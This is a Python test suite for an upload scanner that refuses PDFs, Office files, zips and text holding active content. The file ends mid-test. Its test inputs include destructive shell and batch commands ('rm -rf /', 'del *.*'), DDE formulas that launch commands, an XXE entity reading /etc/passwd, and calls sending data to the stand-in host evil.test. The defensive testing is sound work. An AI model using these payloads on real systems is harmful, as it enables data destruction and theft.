"""The content check: ordinary business files pass, active content is refused.

Every attack sample here is made up and harmless: the scripts only call
``app.alert``, and the "programs" are just their header bytes.
"""

import hashlib
import io
import random
import re
import struct
import time
import unittest
import zipfile
import zlib
from pathlib import Path
from unittest import mock

import pypdfium2 as pdfium
from pdfminer import pdftypes
from PIL import Image

from kaagaz.adapters.scanner import LayeredScanner
from kaagaz.scanning import content
from kaagaz.scanning.content import Finding, inspect
from kaagaz.scanning.gate import CUSTOMER_MESSAGES, REJECTION_CODES, Verdict
from tests.pdf_builder import Page, Picture, Text, make_objstm_pdf, make_pdf
from tests.picture_support import text_like_picture
from tests.test_resolve import compound
from tests.xlsx_builder import make_xlsx, sheet_xml
from tests.zip_builder import stored_zip

WINDOWS_PROGRAM = b"MZ" + b"\x90" * 62 + b"This program cannot be run in DOS mode.\r\r\n$" + b"\x00" * 64
LINUX_PROGRAM = b"\x7fELF\x02\x01\x01" + b"\x00" * 57


def pdf_with(objects: list[bytes], gaps: dict[int, bytes] | None = None) -> bytes:
    """A small PDF with a correct cross-reference table, built from object bodies.

    Object 1 must be the catalog. ``gaps``: what stands between an object's "0" and "obj"
    in its header, by object number (a single space when not given).
    """
    out = io.BytesIO()
    out.write(b"%PDF-1.7\n")
    offsets = []
    for number, body in enumerate(objects, start=1):
        offsets.append(out.tell())
        gap = (gaps or {}).get(number, b" ")
        out.write(b"%d 0" % number + gap + b"obj\n" + body + b"\nendobj\n")
    xref = out.tell()
    out.write(b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1))
    for offset in offsets:
        out.write(b"%010d 00000 n \n" % offset)
    out.write(b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref))
    return out.getvalue()


PAGES = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
PAGE = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>"


def with_broken_object(data: bytes, number: int) -> bytes:
    """``data`` with object ``number``'s cross-reference entry pointing where no object is.

    pdfminer then raises PDFObjectNotFound for it (16 Oct 2026: two scanned uploads did
    this and took a worker down on every delivery)."""
    start = data.index(b"xref\n")
    lines = data[start:].split(b"\n")
    lines[2 + number] = b"%010d 00000 n " % 9  # inside the header line
    return data[:start] + b"\n".join(lines)


def shifted_index(data: bytes, by: int) -> bytes:
    """``data`` with every in-use cross-reference offset ``by`` bytes too far."""
    return re.sub(rb"(\d{10}) 00000 n ", lambda m: b"%010d 00000 n " % (int(m.group(1)) + by), data)


def png_bytes() -> bytes:
    buffer = io.BytesIO()
    Image.new("RGB", (40, 30), "white").save(buffer, "PNG")
    return buffer.getvalue()


def zip_bytes(members: dict[str, bytes], *, encrypted: bool = False) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, data in members.items():
            archive.writestr(name, data)
    raw = bytearray(buffer.getvalue())
    if encrypted:
        # zipfile cannot write encrypted parts, so set the "encrypted" flag bit
        # in every local and central header by hand, as a protected file has.
        for signature, flag_offset in ((b"PK", 6), (b"PK", 8)):
            start = raw.find(signature)
            while start != -1:
                raw[start + flag_offset] |= 0x1
                start = raw.find(signature, start + 4)
    return bytes(raw)


def spreadsheet() -> bytes:
    return make_xlsx(
        [("Sheet1", sheet_xml('<row r="1"><c r="A1" t="inlineStr"><is><t>Total</t></is></c></row>'))]
    )


def with_member(xlsx: bytes, name: str, data: bytes) -> bytes:
    buffer = io.BytesIO(xlsx)
    with zipfile.ZipFile(buffer, "a") as archive:
        archive.writestr(name, data)
    return buffer.getvalue()


class OrdinaryFilesPass(unittest.TestCase):
    def test_a_text_pdf(self) -> None:
        pdf = make_pdf([Page(texts=[Text(72, 700, "Invoice No: INV-1042"), Text(72, 680, "Total: Rs. 500")])])
        self.assertIsNone(inspect(pdf))

    def test_a_pdf_with_an_ordinary_web_link(self) -> None:
        link = b"<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://example.test) >> >>"
        self.assertIsNone(inspect(pdf_with([b"<< /Type /Catalog /Pages 2 0 R >>", PAGES, PAGE, link])))

    def test_a_photo(self) -> None:
        self.assertIsNone(inspect(png_bytes()))

    def test_a_spreadsheet(self) -> None:
        self.assertIsNone(inspect(spreadsheet()))

    def test_a_spreadsheet_with_a_hyperlink(self) -> None:
        rels = (
            b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"'
            b' Target="https://example.test" TargetMode="External"/></Relationships>'
        )
        self.assertIsNone(inspect(with_member(spreadsheet(), "xl/worksheets/_rels/sheet1.xml.rels", rels)))

    def test_a_csv_with_negative_numbers_and_a_sum(self) -> None:
        csv = b"Name,Month,Profit\nSharma Traders,Aug 2026,-1234\nTotal,,=SUM(C2:C3)\n"
        self.assertIsNone(inspect(csv))

    def test_a_csv_with_a_byte_order_mark(self) -> None:
        self.assertIsNone(inspect("\ufeffName,Amount\nA,10\n".encode()))


class PdfActiveContentIsBlocked(unittest.TestCase):
    def blocked(self, catalog_extra: bytes, *more: bytes) -> None:
        catalog = b"<< /Type /Catalog /Pages 2 0 R " + catalog_extra + b" >>"
        self.assertIs(inspect(pdf_with([catalog, PAGES, PAGE, *more])), Finding.BLOCKED)

    def test_javascript_on_open(self) -> None:
        self.blocked(b"/OpenAction << /S /JavaScript /JS (app.alert(1)) >>")

    def test_javascript_in_a_separate_object(self) -> None:
        self.blocked(b"/OpenAction 4 0 R", b"<< /S /JavaScript /JS (app.alert(1)) >>")

    def test_an_obfuscated_javascript_name(self) -> None:
        # "#61" is "a": /J#61vaScript is /JavaScript to a PDF reader.
        self.blocked(
            b"/Names << /J#61vaScript 4 0 R >>", b"<< /Names [(x) 5 0 R] >>", b"<< /S /JavaScript >>"
        )

    def test_a_launch_action(self) -> None:
        self.blocked(b"/OpenAction << /S /Launch /F (cmd.exe) >>")

    def test_an_embedded_file(self) -> None:
        self.blocked(
            b"/Names << /EmbeddedFiles 4 0 R >>", b"<< /Names [(a.exe) 5 0 R] >>", b"<< /Type /Filespec >>"
        )

    def test_a_form_that_submits_data(self) -> None:
        self.blocked(b"/OpenAction << /S /SubmitForm /F (https://evil.test) >>")

    def test_an_xfa_form(self) -> None:
        self.blocked(b"/AcroForm << /XFA 4 0 R >>", b"<< >>")

    def test_an_unreadable_pdf_is_not_called_safe(self) -> None:
        self.assertIs(inspect(b"%PDF-1.7\n" + b"\x00garbage" * 50), Finding.UNSCANNABLE)

    def test_a_pdf_with_an_object_that_is_not_there_is_left_to_the_readers(self) -> None:
        catalog = b"<< /Type /Catalog /Pages 2 0 R >>"
        broken = with_broken_object(pdf_with([catalog, PAGES, PAGE, b"<< /Foo 1 >>"]), 4)
        self.assertIsNone(inspect(broken))

    def test_active_content_after_an_object_that_is_not_there_is_still_blocked(self) -> None:
        catalog = b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>"
        objects = [catalog, PAGES, PAGE, b"<< /Foo 1 >>", b"<< /S /JavaScript /JS (app.alert(1)) >>"]
        self.assertIs(inspect(with_broken_object(pdf_with(objects), 4)), Finding.BLOCKED)


CATALOG_JS = b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>"
JS = b"<< /S /JavaScript /JS (app.alert(1)) >>"


class DamagedPdfsCannotHideActiveContent(unittest.TestCase):
    """Council 17 Oct 2026 (security): an object pdfminer cannot load is skipped, so damage
    must not hide active content that a viewer, which rebuilds a broken index, still
    runs. When anything was skipped, every object header in the file is parsed too."""

    def test_the_javascript_object_itself_broken(self) -> None:
        broken = with_broken_object(pdf_with([CATALOG_JS, PAGES, PAGE, JS]), 4)
        self.assertIs(inspect(broken), Finding.BLOCKED)

    def test_every_entry_broken(self) -> None:
        broken = pdf_with([CATALOG_JS, PAGES, PAGE, JS])
        for number in range(1, 5):
            broken = with_broken_object(broken, number)
        self.assertIn(inspect(broken), (Finding.BLOCKED, Finding.UNSCANNABLE))  # never None
        # With the catalog still found (the trailer names it), the rest broken: blocked.
        broken = pdf_with([CATALOG_JS, PAGES, PAGE, JS])
        for number in range(2, 5):
            broken = with_broken_object(broken, number)
        self.assertIs(inspect(broken), Finding.BLOCKED)

    def test_javascript_after_the_trailer_that_the_index_does_not_list(self) -> None:
        catalog = b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>"
        broken = with_broken_object(pdf_with([catalog, PAGES, PAGE, b"<< /Foo 1 >>"]), 4)
        self.assertIs(inspect(broken + b"5 0 obj\n" + JS + b"\nendobj\n"), Finding.BLOCKED)

    def test_javascript_inside_an_object_stream_with_a_broken_index(self) -> None:
        broken = make_objstm_pdf([CATALOG_JS], [PAGES, PAGE, JS], objstm_offset=9)
        self.assertIs(inspect(broken), Finding.BLOCKED)
        self.assertIsNone(inspect(make_objstm_pdf([CATALOG], [PAGES, PAGE], objstm_offset=9)))

    def test_javascript_in_a_dictionary_that_will_not_parse(self) -> None:
        """An odd dictionary (a key with no value) fails pdfminer's parse, but pdf.js
        still reads the keys before it; one with no "endobj" runs into the next object."""
        for bad in (b"<< /S /JavaScript /JS (app.alert(1)) /Odd >>", JS[:-3]):
            with self.subTest(bad=bad):
                broken = with_broken_object(pdf_with([CATALOG_JS, PAGES, PAGE, bad, b"<< /Foo 1 >>"]), 4)
                self.assertIs(inspect(broken), Finding.BLOCKED)

    def test_an_ordinary_scan_with_a_broken_entry_is_left_to_the_readers(self) -> None:
        scan = make_pdf([Page(picture=Picture(text_like_picture(60, 80), 0, 0, 612, 792))])
        self.assertIsNone(inspect(with_broken_object(scan, 3)))

    def test_a_big_scan_whose_index_is_a_few_bytes_off_passes_in_time(self) -> None:
        """Vrushit UAT, 25 Oct 2026: with every offset 7 bytes off (viewers rebuild such an
        index), pdfminer read on through the image bytes to the next "obj", quadratic in
        them: this 2.4 MB, two-page scan ran out the 20 s deadline and was refused as
        "unscannable"."""
        noise = random.Random(7).randbytes(1240 * 1754)  # noqa: S311 - a fixed seed makes a test scan, not a secret
        gray = Image.frombytes("L", (1240, 1754), noise)
        buffer = io.BytesIO()
        gray.convert("RGB").save(buffer, "JPEG", quality=75)
        jpeg = buffer.getvalue()
        image = (
            b"<< /Type /XObject /Subtype /Image /Width 1240 /Height 1754 /ColorSpace /DeviceRGB"
            b" /BitsPerComponent 8 /Filter /DCTDecode /Length %d >>\nstream\n"
            % len(jpeg)
            + jpeg
            + b"\nendstream"
        )
        draw = b"<< /Length 30 >>\nstream\nq 595 0 0 842 0 0 cm /Im0 Do Q\nendstream"
        objects = [b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R 6 0 R] /Count 2 >>"]
        for first in (3, 6):  # each page, its drawing, its picture
            resources = b"/Resources << /XObject << /Im0 %d 0 R >> >> /Contents %d 0 R" % (
                first + 2,
                first + 1,
            )
            objects += [
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] " + resources + b" >>",
                draw,
                image,
            ]
        scan = shifted_index(pdf_with(objects), 7)
        started = time.monotonic()
        self.assertIsNone(inspect(scan))
        self.assertLess(time.monotonic() - started, 5.0)

    def test_javascript_in_a_pdf_whose_index_is_a_few_bytes_off_is_blocked(self) -> None:
        self.assertIs(inspect(shifted_index(pdf_with([CATALOG_JS, PAGES, PAGE, JS]), 7)), Finding.BLOCKED)
        locked = make_pdf([Page(texts=[Text(72, 700, "Total 500")])], password_protected=True)
        self.assertIs(inspect(shifted_index(locked, 7)), Finding.UNSCANNABLE)  # no repair walk: refused

    def test_an_action_behind_a_header_with_a_comment_is_blocked_at_any_offset(self) -> None:
        """Security review, 25 Oct 2026: PDF syntax reads a comment as white space, so
        "4 0 %c\\nobj" is a header pdfminer and pdfium both read. A stricter header test
        skipped it, and an /OpenAction to JavaScript or Launch behind it passed."""
        launch = b"<< /S /Launch /F (calc.exe) >>"
        for action in (JS, launch):
            commented = pdf_with([CATALOG_JS, PAGES, PAGE, action], gaps={4: b" %c\n"})
            for by in (0, 3):  # the index right, and a few bytes off
                with self.subTest(action=action[:20], off_by=by):
                    self.assertIs(inspect(shifted_index(commented, by)), Finding.BLOCKED)
        # The controls: the same header with nothing active passes; without the comment, blocked.
        self.assertIsNone(inspect(pdf_with([CATALOG, PAGES, PAGE], gaps={3: b" %c\n"})))
        self.assertIs(inspect(pdf_with([CATALOG_JS, PAGES, PAGE, JS])), Finding.BLOCKED)

    def test_a_damaged_encrypted_pdf_is_unscannable(self) -> None:
        # Changed on purpose (#552): a file that needs a password to open is refused as one before
        # its damage is seen, so this is one that opens with no password (an owner password only).
        self.assertIs(inspect(with_broken_object(owner_locked_pdf(), 3)), Finding.UNSCANNABLE)
        locked = make_pdf([Page(texts=[Text(72, 700, "Total 500")])], password_protected=True)
        self.assertIs(inspect(with_broken_object(locked, 3)), Finding.ENCRYPTED)

    def test_javascript_nested_deeper_than_the_walk_is_blocked(self) -> None:
        """A 70-deep /Next chain ending in JavaScript used to be called safe."""
        action = JS
        for _ in range(70):
            action = b"<< /S /GoTo /Next " + action + b" >>"
        self.assertIs(
            inspect(
                pdf_with([b"<< /Type /Catalog /Pages 2 0 R /OpenAction " + action + b" >>", PAGES, PAGE])
            ),
            Finding.BLOCKED,
        )

    def test_a_trailer_pdfminer_asserts_on_is_unscannable_not_a_crash(self) -> None:
        broken = pdf_with([CATALOG, PAGES, PAGE]).replace(b"trailer\n", b"trailerX\n")
        self.assertIs(inspect(broken), Finding.UNSCANNABLE)

    def test_a_spreadsheet_with_a_damaged_compressed_part_is_a_finding_not_a_crash(self) -> None:
        self.assertIs(
            inspect(with_damaged_member(spreadsheet(), "xl/_rels/workbook.xml.rels")), Finding.UNSCANNABLE
        )


CATALOG = b"<< /Type /Catalog /Pages 2 0 R >>"


def with_damaged_member(archive: bytes, name: str) -> bytes:
    """``archive`` with member ``name``'s compressed bytes overwritten (its headers kept), so
    inflating it raises zlib.error."""
    with zipfile.ZipFile(io.BytesIO(archive)) as opened:
        info = opened.getinfo(name)
    raw = bytearray(archive)
    name_len, extra_len = struct.unpack("<HH", raw[info.header_offset + 26 : info.header_offset + 30])
    start = info.header_offset + 30 + name_len + extra_len
    raw[start : start + info.compress_size] = b"\xff" * info.compress_size
    return bytes(raw)


class HiddenProgramsAndPolyglots(unittest.TestCase):
    def test_a_windows_program_inside_a_pdf(self) -> None:
        pdf = make_pdf([Page(texts=[Text(72, 700, "Invoice")])])
        self.assertIs(inspect(pdf + WINDOWS_PROGRAM), Finding.BLOCKED)

    def test_a_linux_program_inside_an_image(self) -> None:
        self.assertIs(inspect(png_bytes() + LINUX_PROGRAM), Finding.BLOCKED)

    def test_an_archive_glued_onto_a_photo(self) -> None:
        self.assertIs(inspect(png_bytes() + zip_bytes({"run.txt": b"hello"})), Finding.BLOCKED)

    def test_a_program_is_refused_whatever_its_name(self) -> None:
        # invoice.pdf.exe: the bytes, not the name, decide.
        self.assertIs(inspect(WINDOWS_PROGRAM), Finding.BLOCKED)

    def test_an_unknown_type_is_refused(self) -> None:
        self.assertIs(inspect(b"\x00\x01\x02\x03 not a document"), Finding.BLOCKED)


class OfficePackages(unittest.TestCase):
    def test_macros(self) -> None:
        self.assertIs(inspect(with_member(spreadsheet(), "xl/vbaProject.bin", b"x")), Finding.BLOCKED)

    def test_excel_4_macro_sheets(self) -> None:
        self.assertIs(
            inspect(with_member(spreadsheet(), "xl/macrosheets/sheet1.xml", b"<x/>")), Finding.BLOCKED
        )

    def test_activex_and_ole_objects(self) -> None:
        for name in ("xl/activeX/activeX1.xml", "xl/embeddings/oleObject1.bin"):
            with self.subTest(name=name):
                self.assertIs(inspect(with_member(spreadsheet(), name, b"x")), Finding.BLOCKED)

    def test_a_chart_s_workbook_or_a_picture_may_be_embedded_nothing_else(self) -> None:
        """#522, security review (6 Nov 2026): a chart in a PowerPoint or Word file keeps its
        data as an embedded .xlsx (ClamAV looks inside it too), and a picture may be embedded;
        an OLE object, any .bin package, a program, a script or a macro-enabled file may not."""
        slides = zip_bytes({"ppt/presentation.xml": b"<p/>", _TYPES: b"<Types/>"})
        letter = zip_bytes({"word/document.xml": b"<w/>", _TYPES: b"<Types/>"})
        allowed = (
            "ppt/embeddings/Microsoft_Excel_Worksheet.xlsx",
            "word/embeddings/Microsoft_Excel_Worksheet1.XLSX",
            "word/embeddings/Microsoft_Word_Document.docx",
            "ppt/embeddings/Microsoft_PowerPoint_Presentation.pptx",
            "ppt/embeddings/image1.png",
            "word/embeddings/image2.jpeg",
            "word/embeddings/image3.emf",
        )
        for name in allowed:
            with self.subTest(name=name):
                self.assertIsNone(inspect(with_member(slides, name, b"x")))
        refused = (
            "word/embeddings/oleObject1.bin",
            "word/embeddings/Microsoft_Excel_Worksheet.bin",
            "ppt/embeddings/package.bin",
            "word/embeddings/run.exe",
            "word/embeddings/hook.dll",
            "word/embeddings/x.js",
            "word/embeddings/x.vbs",
            "word/embeddings/book.xlsm",
            "word/embeddings/letter.docm",
            "word/embeddings/vbaProject.bin",
            "word/embeddings/picture.svg",
            "word/embeddings/notes",
        )
        for name in refused:
            with self.subTest(name=name):
                self.assertIs(inspect(with_member(letter, name, b"x")), Finding.BLOCKED)

    def test_an_executable_or_archive_inside(self) -> None:
        for name in ("xl/media/run.exe", "docs/payload.js", "inner.zip", "report.xlsm"):
            with self.subTest(name=name):
                self.assertIs(inspect(with_member(spreadsheet(), name, b"x")), Finding.BLOCKED)

    def test_path_traversal(self) -> None:
        # Changed on purpose (#522 PR 3): an Office package's ([Content_Types].xml); a plain zip's
        # unsafe paths are refused one by one when it is unpacked (PlainZips below).
        for name in ("../../evil.txt", "/etc/passwd", "C:/Windows/evil.txt", "a/../../b"):
            with self.subTest(name=name):
                self.assertIs(inspect(zip_bytes({_TYPES: b"<Types/>", name: b"x"})), Finding.BLOCKED)

    def test_a_remote_template(self) -> None:
        rels = (
            b'<Relationships><Relationship Id="rId9"'
            b' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"'
            b' Target="https://evil.test/t.dotm" TargetMode="External"/></Relationships>'
        )
        self.assertIs(
            inspect(with_member(spreadsheet(), "xl/_rels/settings.xml.rels", rels)), Finding.BLOCKED
        )

    def test_a_password_protected_part_cannot_be_checked(self) -> None:
        # Changed on purpose (#522 PR 3): an Office package's, as test_path_traversal.
        packed = zip_bytes({_TYPES: b"<Types/>", "a.xml": b"x"}, encrypted=True)
        self.assertIs(inspect(packed), Finding.UNSCANNABLE)


_TYPES = "[Content_Types].xml"


class PlainZips(unittest.TestCase):
    """#522 PR 3: a zip that is a folder of files is unpacked, and every file in it checked on its
    own, so a zip inside it, a part with a password and an unsafe path are refused there, one by
    one, never the whole zip; an executable, a script or a macro file still refuses it whole."""

    def test_a_nested_zip_a_password_and_an_unsafe_path_are_left_to_the_unpacking(self) -> None:
        inner = zip_bytes({"a.csv": b"a,b\n1,2\n"})
        self.assertIsNone(inspect(zip_bytes({"inner.zip": inner, "Old/INNER.ZIP": inner})))
        self.assertIsNone(inspect(zip_bytes({"a.csv": b"x"}, encrypted=True)))
        for name in ("../../evil.txt", "/etc/passwd", "C:/Windows/evil.txt"):
            with self.subTest(name=name):
                self.assertIsNone(inspect(zip_bytes({name: b"x", "ok.csv": b"y"})))

    def test_an_executable_a_script_or_a_macro_file_still_refuses_the_whole_zip(self) -> None:
        for name in ("run.exe", "a/payload.js", "report.xlsm", "archive.rar", "vbaProject.bin"):
            with self.subTest(name=name):
                self.assertIs(inspect(zip_bytes({name: b"x", "ok.csv": b"y"})), Finding.BLOCKED)

    def test_any_office_part_makes_it_a_package_with_every_rule(self) -> None:
        for part in ("word/document.xml", "ppt/presentation.xml", "xl/workbook.xml"):
            with self.subTest(part=part):
                self.assertIs(inspect(zip_bytes({part: b"<x/>", "inner.zip": b"x"})), Finding.BLOCKED)


# An incremental update, which a viewer applies over the PDF before it: the catalog again, now
# running JavaScript when the file is opened (security lead, council 10 Nov 2026).
JS_UPDATE = (
    b"\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 9 0 R >>\nendobj\n"
    b"9 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj\n"
    b"trailer\n<< /Size 10 /Root 1 0 R >>\n%%EOF\n"
)


class StoredZips(unittest.TestCase):
    """#553 (UAT ZP-04/05): a zip whose first file is a PDF stored, not compressed, has a PDF header
    in its first 1 KiB, so a viewer reads the whole zip as a PDF. It was refused whole as a
    polyglot; now that PDF view gets the whole PDF check, as an uploaded PDF does, then the zip
    gets its own. Every other type keeps the hard rule (test_a_pdf_header_hidden_in_another_type).
    The PDFs are 300 dpi scans of a page, as the kit's are."""

    def test_a_zip_of_stored_pdfs_passes(self) -> None:
        extract, challan = scanned_pdf(1, dpi=300), scanned_pdf(1, dpi=250)
        inner = stored_zip([("inner/extract.pdf", extract)])
        for data in (
            stored_zip([("../../outside.pdf", extract), ("inside/extract.pdf", extract)]),  # the path trick
            stored_zip([("outer/inner.zip", inner), ("outer/challan.pdf", challan)]),  # a zip in a zip
            inner,  # kept as a file when unpacked, and checked on its own
        ):
            with self.subTest(first=zipfile.ZipFile(io.BytesIO(data)).namelist()[0]):
                self.assertIn(b"%PDF-", data[:1024])
                self.assertIsNone(inspect(data))

    def test_active_content_a_viewer_finds_in_a_stored_zip_is_blocked(self) -> None:
        clean = scanned_pdf(1, dpi=300)
        commented = zipfile.ZipInfo("b.txt")
        commented.comment = JS_UPDATE
        name = JS_UPDATE.decode().replace("\n", " ") + ".txt"
        for where, data in (
            ("the zip's comment", stored_zip([("a.pdf", clean)], comment=JS_UPDATE)),
            ("a second stored file", stored_zip([("a.pdf", clean), ("b.txt", JS_UPDATE)])),
            ("a file's name", stored_zip([("a.pdf", clean), (name, b"hi")])),
            ("a file's comment", stored_zip([("a.pdf", clean), (commented, b"hi")])),
            ("the stored pdf itself", stored_zip([("a.pdf", clean + JS_UPDATE)])),
        ):
            with self.subTest(where=where):
                self.assertIsNone(content._zip_finding(data))  # every file in it is harmless alone
                self.assertIs(inspect(data), Finding.BLOCKED)

    def test_a_stored_zip_whose_pdf_check_cannot_finish_is_not_called_safe(self) -> None:
        # pdfminer rebuilds the index of a zip read as a PDF from the whole file, a seek per object
        # it finds; for a small PDF that is past the read budget (4x the file), so it is refused.
        self.assertIs(inspect(stored_zip([("a.pdf", pdf_with([CATALOG, PAGES, PAGE]))])), Finding.UNSCANNABLE)


class NewFormats(unittest.TestCase):
    """#522, security review (6 Nov 2026): a HEIC photo is allowed as the other photos are; an
    old Office file (OLE2) is checked, not refused whole."""

    def test_a_heic_photo_is_allowed_as_png_jpeg_and_tiff_are(self) -> None:
        self.assertIsNone(inspect((Path(__file__).with_name("fixtures") / "heic" / "one.heic").read_bytes()))

    def test_an_old_word_excel_or_powerpoint_file_is_allowed(self) -> None:
        for streams in (["WordDocument", "1Table"], ["Workbook"], ["Book"], ["PowerPoint Document"]):
            with self.subTest(streams=streams):
                self.assertIsNone(inspect(compound(streams)))

    def test_macros_or_embedded_objects_refuse_an_old_office_file(self) -> None:
        # Changed on purpose (#552, UAT FF-14): a password-protected .docx (EncryptedPackage) is no
        # longer BLOCKED but ENCRYPTED, so it is told it has a password; see the test below.
        for streams, storages in (
            (["WordDocument"], {"Macros": ["PROJECT", "dir"]}),  # Word's macros
            (["Workbook"], {"_VBA_PROJECT_CUR": ["PROJECT"]}),  # Excel's
            (["Workbook", "_VBA_PROJECT"], {}),
            (["PowerPoint Document"], {"VBA": ["dir"]}),
            (["WordDocument"], {"ObjectPool": ["_1234"]}),  # an embedded OLE object
        ):
            with self.subTest(streams=streams, storages=storages):
                self.assertIs(inspect(compound(streams, storages)), Finding.BLOCKED)

    def test_a_password_protected_word_excel_or_powerpoint_file_is_refused_as_one(self) -> None:
        """#552 (UAT FF-14): an encrypted .docx, .xlsx or .pptx is one OLE2 file of this shape,
        whichever it is; it is still refused, now as having a password, not as holding macros.
        One that also holds macros or an embedded object keeps that verdict."""
        encrypted = ["EncryptionInfo", "EncryptedPackage"]
        self.assertIs(inspect(compound(encrypted, {"\x06DataSpaces": ["Version"]})), Finding.ENCRYPTED)
        for storages in ({"Macros": ["PROJECT"]}, {"ObjectPool": ["_1234"]}):
            with self.subTest(storages=storages):
                self.assertIs(inspect(compound(encrypted, storages)), Finding.BLOCKED)

    def test_a_damaged_old_office_file_cannot_be_checked(self) -> None:
        self.assertIs(inspect(compound(["WordDocument"])[:600]), Finding.UNSCANNABLE)


class PlainText(unittest.TestCase):
    def test_markup_is_only_text_in_html_markdown_and_json(self) -> None:
        # Changed on purpose (#522, security review 6 Nov 2026): the text reader never renders an
        # HTML, Markdown or JSON file, and Download sends it as plain text, an attachment, with
        # nosniff; so markup there is text. A .txt or .csv file, or one with no name, keeps the rule.
        page = b"<html><head><script>alert(1)</script></head><body>Rent</body></html>"
        self.assertIsNone(inspect(page, "page.html"))
        self.assertIsNone(inspect(page, "PAGE.HTM"))
        self.assertIsNone(inspect(b"# Rent\n<iframe src='x'></iframe>\n", "notes.md"))
        self.assertIsNone(inspect(b'{"a": "<script>x()</script>"}', "data.json"))
        for name in ("page.txt", "page.csv", "page", ""):
            with self.subTest(name=name):
                self.assertIs(inspect(page, name), Finding.BLOCKED)
        self.assertIs(inspect(b"<not json>", "data.json"), Finding.BLOCKED)  # read as a .txt
        # Everything else still holds: no hidden program, no formula that runs a command.
        self.assertIs(inspect(b"<p>x</p>\nA,=cmd|' /C calc'!A0\n", "page.html"), Finding.BLOCKED)

    def test_markup_and_scripts_are_refused(self) -> None:
        samples = [
            "<html><body>hi</body></html>",
            "  <svg xmlns='http://www.w3.org/2000/svg'/>",
            "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x/>",
            "{\\rtf1\\ansi hello}",
            "#!/bin/sh\nrm -rf /\n",
            "@echo off\ndel *.*\n",
            "Name,Note\nA,<script>alert(1)</script>\n",
            "Name,Link\nA,javascript:alert(1)\n",
        ]
        for sample in samples:
            with self.subTest(sample=sample[:20]):
                self.assertIs(inspect(sample.encode()), Finding.BLOCKED)

    def test_formulas_that_run_commands_are_refused(self) -> None:
        samples = [
            "Name,Amount\nA,=cmd|' /C calc'!A0\n",
            "Name,Amount\nA,@SUM(1+1)*cmd|' /C calc'!A0\n",
            'Name,Amount\nA,=DDE("cmd";"/C calc";"x")\n',
            'Name,Amount\nA,=HYPERLINK("https://evil.test","click")\n',
            'Name,Amount\nA,+WEBSERVICE("https://evil.test")\n',
        ]
        for sample in samples:
            with self.subTest(sample=sample[12:40]):
                self.assertIs(inspect(sample.encode()), Finding.BLOCKED)


class RecordingScanner:
    def __init__(self) -> None:
        self.calls = 0

    def scan(self, data: bytes, *, name: str | None = None) -> Verdict:
        self.calls += 1
        return Verdict.CLEAN


class TheLayers(unittest.TestCase):
    def test_a_blocked_file_never_reaches_the_virus_scanner(self) -> None:
        inner = RecordingScanner()
        self.assertIs(LayeredScanner(inner).scan(WINDOWS_PROGRAM), Verdict.BLOCKED)
        self.assertEqual(inner.calls, 0)

    def test_an_uninspectable_file_is_unscannable(self) -> None:
        self.assertIs(LayeredScanner(RecordingScanner()).scan(b"%PDF-1.7\n\x00\x00"), Verdict.UNSCANNABLE)

    def test_a_clean_file_still_goes_to_the_virus_scanner(self) -> None:
        inner = RecordingScanner()
        self.assertIs(LayeredScanner(inner).scan(png_bytes()), Verdict.CLEAN)
        self.assertEqual(inner.calls, 1)

    def test_blocked_is_a_rejection_with_a_customer_message(self) -> None:
        self.assertIn("blocked_content", REJECTION_CODES)
        self.assertIn("scripts, macros", CUSTOMER_MESSAGES["blocked_content"])

    def test_a_file_with_a_password_never_reaches_the_virus_scanner(self) -> None:
        """#552 (UAT FF-14): the content check's own verdict, through its child process."""
        locked_pdf = make_pdf([Page(texts=[Text(72, 700, "Total 500")])], password_protected=True)
        for data in (compound(["EncryptionInfo", "EncryptedPackage"]), locked_pdf):
            with self.subTest(data=data[:4]):
                inner = RecordingScanner()
                self.assertIs(LayeredScanner(inner).scan(data), Verdict.ENCRYPTED)
                self.assertEqual(inner.calls, 0)
        self.assertIn("password_protected", REJECTION_CODES)
        self.assertEqual(
            CUSTOMER_MESSAGES["password_protected"],
            "This file has a password, so it can't be opened. Remove the password and upload it again.",
        )


class SecurityReviewBounds(unittest.TestCase):
    """Security review of the incident fix (17 Oct 2026): a sound index cannot hide an
    object a viewer finds, an object stream that cannot be decoded is not called safe,
    and no PDF can grow the check's budget, fill memory or run past the deadline."""

    def test_an_active_object_a_sound_index_leaves_out_is_blocked(self) -> None:
        sound = pdf_with([CATALOG, PAGES, PAGE])
        self.assertIsNone(inspect(sound))
        self.assertIs(inspect(sound + b"4 0 obj\n" + JS + b"\nendobj\n"), Finding.BLOCKED)

    def test_an_object_stream_that_cannot_be_decoded_is_unscannable(self) -> None:
        packed = make_objstm_pdf([CATALOG], [PAGES, PAGE])
        crypt = packed.replace(b"/Filter /FlateDecode", b"/Filter /Crypt      ")
        self.assertEqual(len(crypt), len(packed))
        self.assertIs(inspect(crypt), Finding.UNSCANNABLE)

    def test_a_compressed_object_stream_bomb_is_unscannable(self) -> None:
        bomb = make_objstm_pdf([CATALOG], [PAGES, PAGE, b"<< /A (" + b"0" * (2 << 20) + b") >>"])
        self.assertLess(len(bomb), 64 << 10)  # 2 MiB of text, compressed
        with mock.patch.object(content, "_MAX_DECODED_BYTES", 1 << 20):
            self.assertIs(inspect(bomb), Finding.UNSCANNABLE)
        self.assertIsNone(inspect(bomb))  # within the real bound it is an ordinary file

    def test_object_grants_never_add_up_past_their_ceiling(self) -> None:
        bounds = content._Bounds(100)
        for _ in range(100_000):
